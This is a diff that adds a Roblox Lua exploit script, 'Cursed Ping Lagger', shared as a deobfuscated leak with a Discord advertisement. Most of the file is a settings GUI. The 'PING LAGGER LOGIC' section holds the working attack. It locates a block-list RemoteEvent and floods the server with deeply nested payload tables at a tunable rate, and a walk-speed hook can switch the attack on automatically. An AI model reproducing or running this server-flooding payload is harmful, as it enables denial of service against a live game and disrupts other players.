@@ -1,0 +1,820 @@
+print("deobfuscated by neymarish join discord.gg/aceduel for more leaks")
+-- Cursed Ping Lagger
+-- PC + Controller keybind | Customizable | Auto-save | Auto Brainrot Detection
+
+local UserInputService = game:GetService("UserInputService")
+local TweenService     = game:GetService("TweenService")
+local HttpService      = game:GetService("HttpService")
+local Players          = game:GetService("Players")
+local RunService       = game:GetService("RunService")
+
+local plr              = Players.LocalPlayer
+local plrGui           = plr:WaitForChild("PlayerGui")
+
+-- ══════════════════════════════════════════════════════════════════════
+-- CONFIG & SAVE
+-- ══════════════════════════════════════════════════════════════════════
+local CONFIG_FILE = "CursedPingLagger_Config.json"
+
+local DEFAULT_CFG = {
+    power         = 100000,
+    interval      = 0.125,
+    keybindKb     = "F",
+    keybindGp     = "ButtonR2",
+    autoBrainrot  = true,
+}
+
+local cfg = {
+    power         = DEFAULT_CFG.power,
+    interval      = DEFAULT_CFG.interval,
+    keybindKb     = DEFAULT_CFG.keybindKb,
+    keybindGp     = DEFAULT_CFG.keybindGp,
+    autoBrainrot  = DEFAULT_CFG.autoBrainrot,
+}
+
+local function resolveKb(name)
+    if not name or name == "" or name == "None" then return nil end
+    local ok, val = pcall(function() return Enum.KeyCode[name] end)
+    return (ok and val) or nil
+end
+
+local function saveConfig()
+    local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
+    if ok and encoded and writefile then
+        pcall(writefile, CONFIG_FILE, encoded)
+    end
+end
+
+local function loadConfig()
+    if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
+    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
+    if not ok or type(data) ~= "table" then return end
+
+    cfg.power         = tonumber(data.power) or DEFAULT_CFG.power
+    cfg.interval      = tonumber(data.interval) or DEFAULT_CFG.interval
+    cfg.keybindKb     = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
+    cfg.keybindGp     = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
+    cfg.autoBrainrot  = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CFG.autoBrainrot
+end
+
+loadConfig()
+
+local active           = false
+local listeningFor     = nil
+local remote           = nil
+local brainrotMode     = false
+local lastBrainrotState = false
+local manualOverride   = false
+
+-- ══════════════════════════════════════════════════════════════════════
+-- COLOURS - Pure Black Theme
+-- ══════════════════════════════════════════════════════════════════════
+local C = {
+    bg      = Color3.fromRGB(0, 0, 0),
+    panel   = Color3.fromRGB(0, 0, 0),
+    card    = Color3.fromRGB(8, 8, 8),
+    white   = Color3.fromRGB(255, 255, 255),
+    dim     = Color3.fromRGB(120, 120, 130),
+    green   = Color3.fromRGB(60, 255, 100),
+    red     = Color3.fromRGB(255, 50, 70),
+    black   = Color3.fromRGB(0, 0, 0),
+    gray    = Color3.fromRGB(30, 30, 35),
+}
+
+-- ══════════════════════════════════════════════════════════════════════
+-- DESTROY OLD GUI
+-- ══════════════════════════════════════════════════════════════════════
+for _, kid in pairs(plrGui:GetChildren()) do
+    if kid.Name == "CursedPingLaggerGui" then kid:Destroy() end
+end
+
+local screen = Instance.new("ScreenGui")
+screen.Name         = "CursedPingLaggerGui"
+screen.ResetOnSpawn = false
+screen.DisplayOrder = 15
+screen.Parent       = plrGui
+
+-- ══════════════════════════════════════════════════════════════════════
+-- HELPERS
+-- ══════════════════════════════════════════════════════════════════════
+local function tw(obj, props, t)
+    TweenService:Create(obj,
+        TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        props):Play()
+end
+
+local function makeDraggable(frame)
+    local dragging, dragStart, startPos
+    frame.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1
+        or i.UserInputType == Enum.UserInputType.Touch then
+            dragging  = true
+            dragStart = i.Position
+            startPos  = frame.Position
+            i.Changed:Connect(function()
+                if i.UserInputState == Enum.UserInputState.End then dragging = false end
+            end)
+        end
+    end)
+    frame.InputChanged:Connect(function(i)
+        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement
+                      or i.UserInputType == Enum.UserInputType.Touch) then
+            local d = i.Position - dragStart
+            frame.Position = UDim2.new(
+                startPos.X.Scale, startPos.X.Offset + d.X,
+                startPos.Y.Scale, startPos.Y.Offset + d.Y)
+        end
+    end)
+end
+
+local function isGamepad(kc)
+    local n = kc.Name
+    return n:sub(1,6)=="Button" or n:sub(1,10)=="Thumbstick"
+        or n:sub(1,4)=="DPad" or n=="ButtonSelect" or n=="ButtonStart"
+end
+
+local BLACKLISTED = {
+    [Enum.KeyCode.Escape]      = true,
+    [Enum.KeyCode.LeftControl] = true,
+    [Enum.KeyCode.Unknown]     = true,
+}
+
+-- ══════════════════════════════════════════════════════════════════════
+-- MAIN WINDOW - Pure Black
+-- ══════════════════════════════════════════════════════════════════════
+local MAIN_W, MAIN_H = 200, 80
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name             = "MainFrame"
+mainFrame.Size             = UDim2.new(0, MAIN_W, 0, MAIN_H)
+mainFrame.Position         = UDim2.new(0.5, -MAIN_W/2, 0.5, -MAIN_H/2)
+mainFrame.BackgroundColor3 = C.black
+mainFrame.BackgroundTransparency = 0
+mainFrame.BorderSizePixel  = 0
+mainFrame.Active           = true
+mainFrame.ClipsDescendants = false
+mainFrame.Parent           = screen
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)
+
+makeDraggable(mainFrame)
+
+-- Header
+local header = Instance.new("Frame", mainFrame)
+header.Size             = UDim2.new(1,0,0,28)
+header.BackgroundColor3 = C.black
+header.BackgroundTransparency = 0
+header.BorderSizePixel  = 0
+header.ZIndex           = 2
+Instance.new("UICorner", header).CornerRadius = UDim.new(0,10)
+
+-- Title
+local titleLbl = Instance.new("TextLabel", header)
+titleLbl.Size               = UDim2.new(1,-40,1,0)
+titleLbl.Position           = UDim2.new(0,10,0,0)
+titleLbl.BackgroundTransparency = 1
+titleLbl.Text               = "CURSED PING LAGGER"
+titleLbl.TextColor3         = C.white
+titleLbl.Font               = Enum.Font.GothamBlack
+titleLbl.TextSize           = 8
+titleLbl.TextXAlignment     = Enum.TextXAlignment.Left
+titleLbl.ZIndex             = 3
+
+-- Settings button - Black with gear
+local settingsBtn = Instance.new("TextButton", header)
+settingsBtn.Size             = UDim2.new(0,22,0,22)
+settingsBtn.Position         = UDim2.new(1,-26,0.5,-11)
+settingsBtn.BackgroundColor3 = C.black
+settingsBtn.BackgroundTransparency = 0
+settingsBtn.BorderSizePixel  = 0
+settingsBtn.AutoButtonColor  = false
+settingsBtn.Text             = "⚙️"
+settingsBtn.TextColor3       = Color3.fromRGB(150,150,160)
+settingsBtn.Font             = Enum.Font.GothamBlack
+settingsBtn.TextSize         = 12
+settingsBtn.ZIndex           = 23
+Instance.new("UICorner", settingsBtn).CornerRadius = UDim.new(0,4)
+settingsBtn.MouseEnter:Connect(function() 
+    tw(settingsBtn,{BackgroundColor3=Color3.fromRGB(20,20,25)},0.1) 
+end)
+settingsBtn.MouseLeave:Connect(function() 
+    tw(settingsBtn,{BackgroundColor3=C.black},0.1) 
+end)
+
+-- Main button - Text color changes only
+local activateBtn = Instance.new("TextButton", mainFrame)
+activateBtn.Size             = UDim2.new(1,-14,0,32)
+activateBtn.Position         = UDim2.new(0,7,0,38)
+activateBtn.BackgroundColor3 = C.black
+activateBtn.BackgroundTransparency = 0
+activateBtn.BorderSizePixel  = 0
+activateBtn.AutoButtonColor  = false
+activateBtn.Text             = ""
+activateBtn.ZIndex           = 3
+Instance.new("UICorner", activateBtn).CornerRadius = UDim.new(0,6)
+
+local activateLbl = Instance.new("TextLabel", activateBtn)
+activateLbl.Size            = UDim2.new(1,0,1,0)
+activateLbl.BackgroundTransparency = 1
+activateLbl.Text            = "DISABLED"
+activateLbl.TextColor3      = C.red
+activateLbl.Font            = Enum.Font.GothamBlack
+activateLbl.TextSize        = 11
+activateLbl.ZIndex          = 5
+
+-- ══════════════════════════════════════════════════════════════════════
+-- SETTINGS PANEL - Pure Black
+-- ══════════════════════════════════════════════════════════════════════
+local SET_W, SET_H = 220, 340
+
+local settingsFrame = Instance.new("Frame")
+settingsFrame.Name             = "SettingsPanel"
+settingsFrame.Size             = UDim2.new(0,SET_W,0,SET_H)
+settingsFrame.Position         = UDim2.new(0.5,-SET_W/2,0.5,60)
+settingsFrame.BackgroundColor3 = C.black
+settingsFrame.BackgroundTransparency = 0
+settingsFrame.BorderSizePixel  = 0
+settingsFrame.Active           = true
+settingsFrame.ClipsDescendants = true
+settingsFrame.Visible          = false
+settingsFrame.ZIndex           = 20
+settingsFrame.Parent           = screen
+Instance.new("UICorner", settingsFrame).CornerRadius = UDim.new(0,10)
+
+makeDraggable(settingsFrame)
+
+-- Settings header
+local setHeader = Instance.new("Frame", settingsFrame)
+setHeader.Size             = UDim2.new(1,0,0,28)
+setHeader.BackgroundColor3 = C.black
+setHeader.BackgroundTransparency = 0
+setHeader.BorderSizePixel  = 0
+setHeader.ZIndex           = 21
+Instance.new("UICorner", setHeader).CornerRadius = UDim.new(0,10)
+
+local setTitle = Instance.new("TextLabel", setHeader)
+setTitle.Size               = UDim2.new(1,-70,1,0)
+setTitle.Position           = UDim2.new(0,10,0,0)
+setTitle.BackgroundTransparency = 1
+setTitle.Text               = "SETTINGS"
+setTitle.TextColor3         = C.white
+setTitle.Font               = Enum.Font.GothamBlack
+setTitle.TextSize           = 9
+setTitle.TextXAlignment     = Enum.TextXAlignment.Left
+setTitle.ZIndex             = 22
+
+local setCloseBtn = Instance.new("TextButton", setHeader)
+setCloseBtn.Size             = UDim2.new(0,22,0,22)
+setCloseBtn.Position         = UDim2.new(1,-26,0.5,-11)
+setCloseBtn.BackgroundColor3 = C.black
+setCloseBtn.BackgroundTransparency = 0
+setCloseBtn.BorderSizePixel  = 0
+setCloseBtn.AutoButtonColor  = false
+setCloseBtn.Text             = "✕"
+setCloseBtn.TextColor3       = C.white
+setCloseBtn.Font             = Enum.Font.GothamBlack
+setCloseBtn.TextSize         = 10
+setCloseBtn.ZIndex           = 23
+Instance.new("UICorner", setCloseBtn).CornerRadius = UDim.new(0,4)
+setCloseBtn.MouseEnter:Connect(function() tw(setCloseBtn,{TextColor3=C.red},0.1) end)
+setCloseBtn.MouseLeave:Connect(function() tw(setCloseBtn,{TextColor3=C.white},0.1) end)
+
+-- Input row builder
+local function mkInputRow(yPos, labelText, getValue, onConfirm)
+    local row = Instance.new("Frame", settingsFrame)
+    row.Size             = UDim2.new(1,-16,0,32)
+    row.Position         = UDim2.new(0,8,0,yPos)
+    row.BackgroundColor3 = C.black
+    row.BackgroundTransparency = 0
+    row.BorderSizePixel  = 0
+    row.ZIndex           = 21
+    Instance.new("UICorner", row).CornerRadius = UDim.new(0,6)
+
+    local lbl = Instance.new("TextLabel", row)
+    lbl.Size               = UDim2.new(0.45,0,1,0)
+    lbl.Position           = UDim2.new(0,10,0,0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text               = labelText
+    lbl.TextColor3         = C.white
+    lbl.Font               = Enum.Font.GothamBold
+    lbl.TextSize           = 9
+    lbl.TextXAlignment     = Enum.TextXAlignment.Left
+    lbl.ZIndex             = 22
+
+    local box = Instance.new("TextBox", row)
+    box.Size               = UDim2.new(0,60,0,22)
+    box.Position           = UDim2.new(1,-68,0.5,-11)
+    box.BackgroundColor3   = C.black
+    box.BackgroundTransparency = 0
+    box.BorderSizePixel    = 0
+    box.Text               = tostring(getValue())
+    box.TextColor3         = C.white
+    box.Font               = Enum.Font.GothamBold
+    box.TextSize           = 10
+    box.ClearTextOnFocus   = false
+    box.ZIndex             = 23
+    Instance.new("UICorner", box).CornerRadius = UDim.new(0,4)
+
+    box.Focused:Connect(function() end)
+    box.FocusLost:Connect(function()
+        local n = tonumber(box.Text)
+        if n then
+            onConfirm(n)
+            box.Text = tostring(getValue())
+            saveConfig()
+        else
+            box.Text = tostring(getValue())
+        end
+    end)
+
+    return box
+end
+
+-- Keybind row builder
+local kbBindBtn, gpBindBtn
+
+local function updateKbLabels()
+    if kbBindBtn then
+        if listeningFor == "kb" then
+            kbBindBtn.Text      = "Press a key..."
+            kbBindBtn.TextColor3 = Color3.fromRGB(255,200,100)
+        else
+            kbBindBtn.Text      = cfg.keybindKb ~= "" and cfg.keybindKb or "None"
+            kbBindBtn.TextColor3 = C.white
+        end
+    end
+    if gpBindBtn then
+        if listeningFor == "gp" then
+            gpBindBtn.Text      = "Press a button..."
+            gpBindBtn.TextColor3 = Color3.fromRGB(255,200,100)
+        else
+            gpBindBtn.Text      = cfg.keybindGp ~= "" and cfg.keybindGp or "None"
+            gpBindBtn.TextColor3 = C.white
+        end
+    end
+end
+
+local function mkKeybindRow(yPos, labelText, which)
+    local row = Instance.new("Frame", settingsFrame)
+    row.Size             = UDim2.new(1,-16,0,32)
+    row.Position         = UDim2.new(0,8,0,yPos)
+    row.BackgroundColor3 = C.black
+    row.BackgroundTransparency = 0
+    row.BorderSizePixel  = 0
+    row.ZIndex           = 21
+    Instance.new("UICorner", row).CornerRadius = UDim.new(0,6)
+
+    local lbl = Instance.new("TextLabel", row)
+    lbl.Size               = UDim2.new(0.4,0,1,0)
+    lbl.Position           = UDim2.new(0,10,0,0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text               = labelText
+    lbl.TextColor3         = C.white
+    lbl.Font               = Enum.Font.GothamBold
+    lbl.TextSize           = 9
+    lbl.TextXAlignment     = Enum.TextXAlignment.Left
+    lbl.ZIndex             = 22
+
+    local bindBtn = Instance.new("TextButton", row)
+    bindBtn.Size             = UDim2.new(0,68,0,22)
+    bindBtn.Position         = UDim2.new(1,-84,0.5,-11)
+    bindBtn.BackgroundColor3 = C.black
+    bindBtn.BackgroundTransparency = 0
+    bindBtn.BorderSizePixel  = 0
+    bindBtn.AutoButtonColor  = false
+    bindBtn.Font             = Enum.Font.GothamBold
+    bindBtn.TextSize         = 9
+    bindBtn.TextColor3       = C.white
+    bindBtn.ZIndex           = 23
+    bindBtn.Text             = which == "kb" and cfg.keybindKb or cfg.keybindGp
+    Instance.new("UICorner", bindBtn).CornerRadius = UDim.new(0,4)
+    bindBtn.MouseButton1Click:Connect(function()
+        listeningFor = (listeningFor == which) and nil or which
+        updateKbLabels()
+    end)
+
+    local clearBtn = Instance.new("TextButton", row)
+    clearBtn.Size             = UDim2.new(0,22,0,22)
+    clearBtn.Position         = UDim2.new(1,-26,0.5,-11)
+    clearBtn.BackgroundColor3 = C.black
+    clearBtn.BackgroundTransparency = 0
+    clearBtn.BorderSizePixel  = 0
+    clearBtn.AutoButtonColor  = false
+    clearBtn.Text             = "✕"
+    clearBtn.TextColor3       = C.red
+    clearBtn.Font             = Enum.Font.GothamBlack
+    clearBtn.TextSize         = 9
+    clearBtn.ZIndex           = 23
+    Instance.new("UICorner", clearBtn).CornerRadius = UDim.new(0,4)
+    clearBtn.MouseEnter:Connect(function() tw(clearBtn,{TextColor3=C.white},0.1) end)
+    clearBtn.MouseLeave:Connect(function() tw(clearBtn,{TextColor3=C.red},0.1) end)
+
+    clearBtn.MouseButton1Click:Connect(function()
+        if listeningFor == which then listeningFor = nil end
+        if which == "kb" then cfg.keybindKb = "None" else cfg.keybindGp = "None" end
+        updateKbLabels()
+        saveConfig()
+    end)
+
+    if which == "kb" then kbBindBtn = bindBtn end
+    if which == "gp" then gpBindBtn = bindBtn end
+
+    return bindBtn
+end
+
+-- Auto Brainrot toggle
+local autoBrainrotBtn
+
+local function createBrainrotRow(yPos)
+    local row = Instance.new("Frame", settingsFrame)
+    row.Size             = UDim2.new(1,-16,0,32)
+    row.Position         = UDim2.new(0,8,0,yPos)
+    row.BackgroundColor3 = C.black
+    row.BackgroundTransparency = 0
+    row.BorderSizePixel  = 0
+    row.ZIndex           = 21
+    Instance.new("UICorner", row).CornerRadius = UDim.new(0,6)
+
+    local lbl = Instance.new("TextLabel", row)
+    lbl.Size               = UDim2.new(0.65,0,1,0)
+    lbl.Position           = UDim2.new(0,10,0,0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text               = "Auto Brainrot"
+    lbl.TextColor3         = C.white
+    lbl.Font               = Enum.Font.GothamBold
+    lbl.TextSize           = 9
+    lbl.TextXAlignment     = Enum.TextXAlignment.Left
+    lbl.ZIndex             = 22
+
+    local toggleBtn = Instance.new("TextButton", row)
+    toggleBtn.Size             = UDim2.new(0,46,0,22)
+    toggleBtn.Position         = UDim2.new(1,-54,0.5,-11)
+    toggleBtn.BackgroundColor3 = cfg.autoBrainrot and Color3.fromRGB(10,50,20) or Color3.fromRGB(60,10,15)
+    toggleBtn.BorderSizePixel  = 0
+    toggleBtn.AutoButtonColor  = false
+    toggleBtn.Text             = cfg.autoBrainrot and "ON" or "OFF"
+    toggleBtn.TextColor3       = C.white
+    toggleBtn.Font             = Enum.Font.GothamBlack
+    toggleBtn.TextSize         = 8
+    toggleBtn.ZIndex           = 23
+    Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(1,0)
+
+    toggleBtn.MouseButton1Click:Connect(function()
+        cfg.autoBrainrot = not cfg.autoBrainrot
+        toggleBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
+        tw(toggleBtn, {BackgroundColor3 = cfg.autoBrainrot and Color3.fromRGB(10,50,20) or Color3.fromRGB(60,10,15)}, 0.15)
+        saveConfig()
+    end)
+
+    autoBrainrotBtn = toggleBtn
+    return toggleBtn
+end
+
+-- Build rows
+local Y = 32
+local GAP = 5
+
+local powerBox = mkInputRow(Y, "Power", function() return cfg.power end, function(v)
+    cfg.power = math.max(1, v)
+end)
+Y = Y + 32 + GAP
+
+local intervalBox = mkInputRow(Y, "Delay (secs)", function() return cfg.interval end, function(v)
+    cfg.interval = math.max(0.01, v)
+end)
+Y = Y + 32 + GAP
+
+createBrainrotRow(Y)
+Y = Y + 32 + GAP
+
+local div = Instance.new("Frame", settingsFrame)
+div.Size             = UDim2.new(1,-20,0,1)
+div.Position         = UDim2.new(0,10,0,Y)
+div.BackgroundColor3 = Color3.fromRGB(40,40,50)
+div.BorderSizePixel  = 0
+div.BackgroundTransparency = 0.5
+div.ZIndex           = 21
+Y = Y + 8
+
+local kbSectLbl = Instance.new("TextLabel", settingsFrame)
+kbSectLbl.Size               = UDim2.new(1,-16,0,14)
+kbSectLbl.Position           = UDim2.new(0,8,0,Y)
+kbSectLbl.BackgroundTransparency = 1
+kbSectLbl.Text               = "KEYBINDS"
+kbSectLbl.TextColor3         = C.dim
+kbSectLbl.Font               = Enum.Font.GothamBold
+kbSectLbl.TextSize           = 7
+kbSectLbl.TextXAlignment     = Enum.TextXAlignment.Left
+kbSectLbl.ZIndex             = 21
+Y = Y + 14
+
+mkKeybindRow(Y, "Keyboard",   "kb"); Y = Y + 32 + GAP
+mkKeybindRow(Y, "Controller", "gp"); Y = Y + 32 + GAP
+
+local resetBtn = Instance.new("TextButton", settingsFrame)
+resetBtn.Size             = UDim2.new(1,-16,0,24)
+resetBtn.Position         = UDim2.new(0,8,0,Y)
+resetBtn.BackgroundColor3 = Color3.fromRGB(60,10,15)
+resetBtn.BackgroundTransparency = 0
+resetBtn.BorderSizePixel  = 0
+resetBtn.AutoButtonColor  = false
+resetBtn.Text             = "Reset Defaults"
+resetBtn.TextColor3       = C.white
+resetBtn.Font             = Enum.Font.GothamBold
+resetBtn.TextSize         = 9
+resetBtn.ZIndex           = 21
+Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0,6)
+resetBtn.MouseEnter:Connect(function() tw(resetBtn,{BackgroundColor3=Color3.fromRGB(80,15,20)},0.1) end)
+resetBtn.MouseLeave:Connect(function() tw(resetBtn,{BackgroundColor3=Color3.fromRGB(60,10,15)},0.1) end)
+
+-- Confirm dialog
+local confirmBackdrop = Instance.new("Frame")
+confirmBackdrop.Name                   = "ConfirmBackdrop"
+confirmBackdrop.Size                   = UDim2.new(1,0,1,0)
+confirmBackdrop.BackgroundColor3       = Color3.fromRGB(0,0,0)
+confirmBackdrop.BackgroundTransparency = 0.60
+confirmBackdrop.BorderSizePixel        = 0
+confirmBackdrop.Visible                = false
+confirmBackdrop.ZIndex                 = 50
+confirmBackdrop.Parent                 = screen
+
+local confirmBox = Instance.new("Frame", confirmBackdrop)
+confirmBox.Size             = UDim2.new(0,200,0,110)
+confirmBox.Position         = UDim2.new(0.5,-100,0.5,-55)
+confirmBox.BackgroundColor3 = C.black
+confirmBox.BackgroundTransparency = 0
+confirmBox.BorderSizePixel  = 0
+confirmBox.ZIndex           = 51
+Instance.new("UICorner", confirmBox).CornerRadius = UDim.new(0,10)
+
+local confirmLbl = Instance.new("TextLabel", confirmBox)
+confirmLbl.Size               = UDim2.new(1,-16,0,50)
+confirmLbl.Position           = UDim2.new(0,8,0,8)
+confirmLbl.BackgroundTransparency = 1
+confirmLbl.Text               = "Reset all settings to defaults?"
+confirmLbl.TextWrapped        = true
+confirmLbl.TextColor3         = C.white
+confirmLbl.Font               = Enum.Font.GothamBold
+confirmLbl.TextSize           = 10
+confirmLbl.ZIndex             = 52
+
+local confirmYes = Instance.new("TextButton", confirmBox)
+confirmYes.Size             = UDim2.new(0,86,0,28)
+confirmYes.Position         = UDim2.new(0,8,1,-36)
+confirmYes.BackgroundColor3 = Color3.fromRGB(60,10,15)
+confirmYes.BackgroundTransparency = 0
+confirmYes.BorderSizePixel  = 0
+confirmYes.AutoButtonColor  = false
+confirmYes.Text             = "Confirm"
+confirmYes.TextColor3       = C.white
+confirmYes.Font             = Enum.Font.GothamBlack
+confirmYes.TextSize         = 10
+confirmYes.ZIndex           = 52
+Instance.new("UICorner", confirmYes).CornerRadius = UDim.new(0,6)
+confirmYes.MouseEnter:Connect(function() tw(confirmYes,{BackgroundColor3=Color3.fromRGB(80,15,20)},0.1) end)
+confirmYes.MouseLeave:Connect(function() tw(confirmYes,{BackgroundColor3=Color3.fromRGB(60,10,15)},0.1) end)
+
+local confirmNo = Instance.new("TextButton", confirmBox)
+confirmNo.Size             = UDim2.new(0,86,0,28)
+confirmNo.Position         = UDim2.new(1,-94,1,-36)
+confirmNo.BackgroundColor3 = C.black
+confirmNo.BackgroundTransparency = 0
+confirmNo.BorderSizePixel  = 0
+confirmNo.AutoButtonColor  = false
+confirmNo.Text             = "Cancel"
+confirmNo.TextColor3       = C.dim
+confirmNo.Font             = Enum.Font.GothamBold
+confirmNo.TextSize         = 10
+confirmNo.ZIndex           = 52
+Instance.new("UICorner", confirmNo).CornerRadius = UDim.new(0,6)
+confirmNo.MouseEnter:Connect(function() tw(confirmNo,{TextColor3=C.white},0.1) end)
+confirmNo.MouseLeave:Connect(function() tw(confirmNo,{TextColor3=C.dim},0.1) end)
+
+local function hideConfirm() confirmBackdrop.Visible = false end
+
+confirmNo.MouseButton1Click:Connect(hideConfirm)
+
+confirmYes.MouseButton1Click:Connect(function()
+    cfg.power     = DEFAULT_CFG.power
+    cfg.interval  = DEFAULT_CFG.interval
+    cfg.keybindKb = DEFAULT_CFG.keybindKb
+    cfg.keybindGp = DEFAULT_CFG.keybindGp
+    cfg.autoBrainrot = DEFAULT_CFG.autoBrainrot
+    powerBox.Text    = tostring(cfg.power)
+    intervalBox.Text = tostring(cfg.interval)
+    updateKbLabels()
+    if autoBrainrotBtn then
+        autoBrainrotBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
+        tw(autoBrainrotBtn, {BackgroundColor3 = cfg.autoBrainrot and Color3.fromRGB(10,50,20) or Color3.fromRGB(60,10,15)}, 0.15)
+    end
+    saveConfig()
+    hideConfirm()
+end)
+
+resetBtn.MouseButton1Click:Connect(function()
+    confirmLbl.Text = "Reset all settings to defaults?"
+    confirmBackdrop.Visible = true
+end)
+
+-- Settings open/close
+local settingsOpen = false
+
+local function openSettings()
+    settingsOpen          = true
+    settingsFrame.Visible = true
+    settingsFrame.Size    = UDim2.new(0,SET_W,0,0)
+    tw(settingsFrame, {Size=UDim2.new(0,SET_W,0,SET_H)}, 0.2)
+    tw(settingsBtn, {BackgroundColor3=Color3.fromRGB(20,20,25)}, 0.12)
+    powerBox.Text    = tostring(cfg.power)
+    intervalBox.Text = tostring(cfg.interval)
+    updateKbLabels()
+    if autoBrainrotBtn then
+        autoBrainrotBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
+        autoBrainrotBtn.BackgroundColor3 = cfg.autoBrainrot and Color3.fromRGB(10,50,20) or Color3.fromRGB(60,10,15)
+    end
+end
+
+local function closeSettings()
+    settingsOpen = false
+    listeningFor = nil
+    updateKbLabels()
+    tw(settingsFrame, {Size=UDim2.new(0,SET_W,0,0)}, 0.16)
+    task.delay(0.18, function() settingsFrame.Visible = false end)
+    tw(settingsBtn, {BackgroundColor3=C.black}, 0.12)
+    hideConfirm()
+end
+
+settingsBtn.MouseButton1Click:Connect(function()
+    if settingsOpen then closeSettings() else openSettings() end
+end)
+setCloseBtn.MouseButton1Click:Connect(closeSettings)
+
+-- ══════════════════════════════════════════════════════════════════════
+-- PING LAGGER LOGIC
+-- ══════════════════════════════════════════════════════════════════════
+
+local function findRemote()
+    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
+    if not rrs then return nil end
+    local remote
+    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
+        local r = rrs:FindFirstChild(name)
+        if r and r:IsA("RemoteEvent") then remote = r break end
+    end
+    if not remote then
+        for _, c in ipairs(rrs:GetChildren()) do
+            if c:IsA("RemoteEvent") and c.Name:find("Block") then remote = c break end
+        end
+    end
+    return remote
+end
+
+remote = findRemote()
+
+local function buildPayload(power)
+    local main = {}
+    local nested = {{}}
+    local current = nested[1]
+    for _ = 1, 186 do
+        local n = {}
+        table.insert(current, n)
+        current = n
+    end
+    local maxRep = math.min(math.floor(power / 188), 10000)
+    for _ = 1, maxRep do
+        table.insert(main, nested)
+    end
+    return main
+end
+
+local function runPingLoop()
+    local delay = cfg.interval
+    while active and remote do
+        local payload = buildPayload(cfg.power)
+        local ok = pcall(function() remote:FireServer(payload) end)
+        if not ok then
+            delay = math.min(delay * 1.5, 0.5)
+        else
+            delay = math.max(delay * 0.995, 0.05)
+        end
+        task.wait(delay)
+    end
+end
+
+local function flipLag(state, isManual)
+    active = state
+
+    if isManual then
+        if brainrotMode then
+            manualOverride = not state
+        else
+            manualOverride = false
+        end
+    end
+
+    if active then
+        if not remote then
+            remote = findRemote()
+            if not remote then
+                active = false
+                flipLag(false)
+                return
+            end
+        end
+        -- Green text when enabled
+        activateLbl.Text       = "ENABLED"
+        activateLbl.TextColor3 = C.green
+        task.spawn(runPingLoop)
+    else
+        -- Red text when disabled
+        activateLbl.Text       = "DISABLED"
+        activateLbl.TextColor3 = C.red
+    end
+end
+
+-- Button click
+activateBtn.MouseButton1Click:Connect(function()
+    flipLag(not active, true)
+end)
+
+-- ══════════════════════════════════════════════════════════════════════
+-- AUTO BRAINROT DETECTION
+-- ══════════════════════════════════════════════════════════════════════
+RunService.Heartbeat:Connect(function()
+    if not cfg.autoBrainrot then
+        if brainrotMode then
+            brainrotMode = false
+            lastBrainrotState = false
+        end
+        return
+    end
+
+    local char = plr.Character
+    if not char then return end
+    local hum = char:FindFirstChild("Humanoid")
+    if not hum then return end
+
+    local hasBrainrot = hum.WalkSpeed < 25
+
+    if hasBrainrot and not lastBrainrotState then
+        brainrotMode = true
+        lastBrainrotState = true
+        manualOverride = false
+        flipLag(true)
+    elseif not hasBrainrot and lastBrainrotState then
+        brainrotMode = false
+        lastBrainrotState = false        manualOverride = false
+        flipLag(false)
+    end
+end)
+
+-- ══════════════════════════════════════════════════════════════════════
+-- INPUT HANDLER
+-- ══════════════════════════════════════════════════════════════════════
+UserInputService.InputBegan:Connect(function(input, processed)
+    local kc  = input.KeyCode
+    if kc == Enum.KeyCode.Unknown then return end
+
+    local isGp = isGamepad(kc)
+    local isKb = input.UserInputType == Enum.UserInputType.Keyboard
+
+    if listeningFor then
+        if kc == Enum.KeyCode.Escape then
+            listeningFor = nil
+            updateKbLabels()
+            return
+        end
+        if listeningFor == "kb" and isKb and not BLACKLISTED[kc] then
+            cfg.keybindKb = kc.Name
+            listeningFor  = nil
+            updateKbLabels()
+            saveConfig()
+            return
+        end
+        if listeningFor == "gp" and isGp then
+            cfg.keybindGp = kc.Name
+            listeningFor  = nil
+            updateKbLabels()
+            saveConfig()
+            return
+        end
+        return
+    end
+
+    if processed then return end
+
+    if kc == Enum.KeyCode.LeftControl then
+        mainFrame.Visible = not mainFrame.Visible
+        if not mainFrame.Visible then closeSettings() end
+        return
+    end
+
+    local kbEnum = resolveKb(cfg.keybindKb)
+    local gpEnum = resolveKb(cfg.keybindGp)
+
+    if (kbEnum and kc == kbEnum and isKb)
+    or (gpEnum and kc == gpEnum and isGp) then
+        flipLag(not active, true)
+    end
+end)
+
+updateKbLabels()
